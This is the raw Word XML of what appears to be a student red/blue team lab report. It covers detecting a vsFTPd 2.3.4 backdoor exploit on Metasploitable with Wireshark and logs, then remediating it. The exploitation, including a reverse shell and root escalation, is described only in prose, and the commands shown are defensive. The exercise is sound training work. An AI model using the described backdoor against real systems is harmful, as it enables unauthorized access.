    <w:p w14:paraId="5408397B" w14:textId="77777777" w:rsidR="008E45D1" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>3. Detection: Blue Team Actions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A9218B8" w14:textId="77777777" w:rsidR="008E45D1" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.1 Packet Capture with Wireshark</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31CB4068" w14:textId="12C7967D" w:rsidR="008E45D1" w:rsidRDefault="00FF7555">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251669504" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="02A17891" wp14:editId="446ED555">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>757238</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>1520507</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="238125" cy="733425"/>
                <wp:effectExtent l="57150" t="19050" r="85725" b="104775"/>
                <wp:wrapNone/>
                <wp:docPr id="1340276587" name="Rectangle 13"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="238125" cy="733425"/>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5E208" id="Rectangle 13" o:spid="_x0000_s1026" style="position:absolute;margin-left:59.65pt;margin-top:119.7pt;width:18.75pt;height:5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67456" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="6CC5F60C" wp14:editId="6F10DEC2">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>1295400</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>1530033</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="280988" cy="738187"/>
                <wp:effectExtent l="57150" t="19050" r="81280" b="100330"/>
                <wp:wrapNone/>
                <wp:docPr id="1027500853" name="Rectangle 13"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="280988" cy="738187"/>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FD6C3" id="Rectangle 13" o:spid="_x0000_s1026" style="position:absolute;margin-left:102pt;margin-top:120.5pt;width:22.15pt;height:58.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63360" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="71D57605" wp14:editId="6AAAE568">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>271462</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>1391602</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="290512" cy="57150"/>
                <wp:effectExtent l="57150" t="19050" r="71755" b="95250"/>
                <wp:wrapNone/>
                <wp:docPr id="883079936" name="Rectangle 13"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="290512" cy="57150"/>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110FE" id="Rectangle 13" o:spid="_x0000_s1026" style="position:absolute;margin-left:21.35pt;margin-top:109.55pt;width:22.85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" fillcolor="#e00" strokecolor="#4579b8 [3044]">
                <v:shadow on="t" color="black" opacity="22937f" origin=",.5" offset="0,.63889mm"/>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:t>Wireshark was used to capture network traffic between the attacker (Kali Linux) and the target (Metasploitable).</w:t>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:br/>
        <w:t>Filters were applied to focus on traffic involving the attacker’s IP:</w:t>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:br/>
        <w:t>```plaintext</w:t>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00000000">
        <w:t>ip.src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00000000">
        <w:t xml:space="preserve"> == 192.</w:t>
      </w:r>
      <w:r>
        <w:t>66</w:t>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:t>.y.y  # Attacker's IP</w:t>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00000000">
        <w:t>ip.dst</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00000000">
        <w:t xml:space="preserve"> == 192.</w:t>
      </w:r>
      <w:r>
        <w:t>66</w:t>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:t>.x.x  # Target's IP</w:t>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="28321E9C" wp14:editId="7595554A">
            <wp:extent cx="5486400" cy="1469390"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="5957626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2613" name="Picture 595762613"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId9"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5486400" cy="1469390"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:br/>
        <w:t>- The following traffic was identified:</w:t>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:br/>
        <w:t xml:space="preserve">  - FTP traffic (Port 21) showing connections between the attacker and target.</w:t>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:br/>
        <w:t xml:space="preserve">  - Reverse shell connection from Metasploitable to Kali, establishing the Meterpreter session.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D72AF65" w14:textId="77777777" w:rsidR="008E45D1" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.2 Log Review</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13BF98D3" w14:textId="77777777" w:rsidR="008E45D1" w:rsidRDefault="00000000">
      <w:r>
        <w:t>The Blue Team examined logs from the Metasploitable machine to identify suspicious activity:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>- Authentication logs indicated a failed FTP login attempt followed by a successful connection.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- System logs showed commands executed by the attacker with root privileges.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="673F23FB" w14:textId="5087583D" w:rsidR="00B31ADC" w:rsidRDefault="00B31ADC" w:rsidP="00B31ADC">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251683840" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="18FFFAB2" wp14:editId="7A32B52D">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>2639332</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>978898</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="429986" cy="108857"/>
                <wp:effectExtent l="57150" t="19050" r="84455" b="100965"/>
                <wp:wrapNone/>
                <wp:docPr id="1779382940" name="Rectangle 17"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="429986" cy="108857"/>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BED0C" id="Rectangle 17" o:spid="_x0000_s1026" style="position:absolute;margin-left:207.8pt;margin-top:77.1pt;width:33.85pt;height:8.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" fillcolor="#e00" strokecolor="#4579b8 [3044]">
                <v:shadow on="t" color="black" opacity="22937f" origin=",.5" offset="0,.63889mm"/>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251677696" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="560C9529" wp14:editId="4066E97F">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>2536190</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>836930</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="429986" cy="108857"/>
                <wp:effectExtent l="57150" t="19050" r="84455" b="100965"/>
                <wp:wrapNone/>
                <wp:docPr id="309550160" name="Rectangle 17"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="429986" cy="108857"/>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807139" id="Rectangle 17" o:spid="_x0000_s1026" style="position:absolute;margin-left:199.7pt;margin-top:65.9pt;width:33.85pt;height:8.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" fillcolor="#e00" strokecolor="#4579b8 [3044]">
                <v:shadow on="t" color="black" opacity="22937f" origin=",.5" offset="0,.63889mm"/>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="277809D0" wp14:editId="71A5BC6D">
            <wp:extent cx="3303814" cy="1802567"/>
            <wp:effectExtent l="0" t="0" r="0" b="7620"/>
            <wp:docPr id="760024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4462" name="Picture 760024462"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId10"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3328008" cy="1815767"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3856960B" w14:textId="77777777" w:rsidR="008E45D1" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>4. Remediation: Defensive Measures</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CC6F118" w14:textId="77777777" w:rsidR="008E45D1" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.1 Immediate Remediation Steps</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E09C5A8" w14:textId="77777777" w:rsidR="0033161C" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Stopped the Vulnerable Service: The vsFTPd service was immediately stopped:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>sudo service vsftpd stop</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sudo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>systemctl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> disable </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>vsftpd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="54E3A732" w14:textId="49A6A23B" w:rsidR="00B31ADC" w:rsidRDefault="00B31ADC">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="18AA98D6" wp14:editId="75F758AA">
            <wp:extent cx="5048955" cy="333422"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
            <wp:docPr id="1140200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0122" name="Picture 1140200122"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId11"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5048955" cy="333422"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="11679AE1" w14:textId="77777777" w:rsidR="00B31ADC" w:rsidRDefault="00B31ADC">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5EF78012" wp14:editId="57F929C0">
            <wp:extent cx="4857750" cy="219075"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
            <wp:docPr id="115741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2110" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId12"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4857750" cy="219075"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BFD773A" w14:textId="77777777" w:rsidR="00B31ADC" w:rsidRDefault="00000000">
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">- Removed </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>vsFTPd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> and Installed Secure FTP Alternatives:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>sudo apt-get remove --purge vsftpd</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sudo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> apt-get install </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>proftp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="271C2267" w14:textId="5CFF77E7" w:rsidR="008E45D1" w:rsidRDefault="00B31ADC">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4FA7CABC" wp14:editId="75658A59">
            <wp:extent cx="5486400" cy="1852930"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="21325316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31657" name="Picture 2132531657"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId13"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5486400" cy="1852930"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00000000">
        <w:t>ProFTPD</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00000000">
        <w:t xml:space="preserve"> was installed as a more secure FTP server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0275CB8B" w14:textId="77777777" w:rsidR="008E45D1" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>5. After Action Report: Lessons Learned and Automation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C0E3F7A" w14:textId="77777777" w:rsidR="008E45D1" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.1 Lessons Learned</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49A61D10" w14:textId="77777777" w:rsidR="008E45D1" w:rsidRDefault="00000000">
      <w:r>
        <w:t>FTP Services: Running outdated or unpatched FTP services can expose systems to serious vulnerabilities. It’s critical to regularly update and patch services to prevent exploitation.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Network Traffic Monitoring: Effective monitoring of network traffic using tools like Wireshark is essential for identifying abnormal activity, such as reverse shell connections.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Privilege Escalation: Once access is gained, privilege escalation techniques can quickly lead to root access. Proper access control and regular system auditing are crucial to limiting the damage of such attacks.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="700DB468" w14:textId="77777777" w:rsidR="008E45D1" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.3 Impact Analysis</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58CEE155" w14:textId="77777777" w:rsidR="008E45D1" w:rsidRDefault="00000000">
      <w:r>
        <w:t>If this breach had occurred in a real production environment, the company could have faced:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Loss of sensitive data if unauthorized access was used to steal or alter files.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- System downtime caused by attackers modifying critical files or introducing backdoors.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Reputation damage due to the exposure of vulnerabilities in publicly accessible services (like FTP).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13A754EB" w14:textId="77777777" w:rsidR="008E45D1" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>6. Conclusion</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15718973" w14:textId="77777777" w:rsidR="008E45D1" w:rsidRDefault="00000000">
      <w:r>
        <w:t>The Red Team successfully exploited the vsFTPd 2.3.4 backdoor vulnerability and escalated privileges to root access. The Blue Team effectively detected the attack using Wireshark and system logs, followed by immediate remediation actions to secure the system.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>By implementing secure configurations, firewall rules, and automatic patching, the target system was hardened against further attacks. This exercise highlights the importance of monitoring, updating, and securing services to prevent exploitation.</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="008E45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980713">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="2037728195">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="2087025834">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="953287518">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="380398109">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="1531722177">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="820731355">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="192228754">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="3816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C2"/>
    <w:rsid w:val="00034616"/>
    <w:rsid w:val="0006063C"/>
    <w:rsid w:val="0015074B"/>
    <w:rsid w:val="00152AB4"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="0033161C"/>
    <w:rsid w:val="008E45D1"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00B31ADC"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00C8073B"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00FC693F"/>
    <w:rsid w:val="00FF7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3C4DB"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{FFA69FC1-62C6-4CCE-86B8-AE06F5EB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RAVRIYA</cp:lastModifiedBy>
  <cp:revision>2</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-12-23T23:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-02-17T16:05:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>